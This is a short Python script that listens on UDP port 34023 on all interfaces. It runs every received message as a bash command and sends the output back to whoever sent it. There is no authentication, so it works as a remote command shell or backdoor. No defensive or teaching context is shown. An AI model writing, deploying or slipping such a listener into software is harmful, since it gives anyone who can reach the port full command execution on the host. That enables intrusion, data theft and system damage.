#!/usr/bin/python3
import random
import socket
import subprocess, sys

port = 34023

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('', 34023))

command = 'ls -l'

def execute(commandi, address):

    try:
        result = subprocess.check_output(command, shell = True, executable = "/bin/bash", stderr = subprocess.STDOUT)

    except subprocess.CalledProcessError as cpe:
        result = cpe.output

    finally:
        for line in result.splitlines():
            print(line.decode())
#            print("====")
            server_socket.sendto(line, address)


while True:
#    rand = random.randint(0, 10)
    message, address = server_socket.recvfrom(1024)
#    if 5 >= 4:
    command = message.decode('utf-8')
    print(command)
    execute(command, address)
#    server_socket.sendto(message, address)


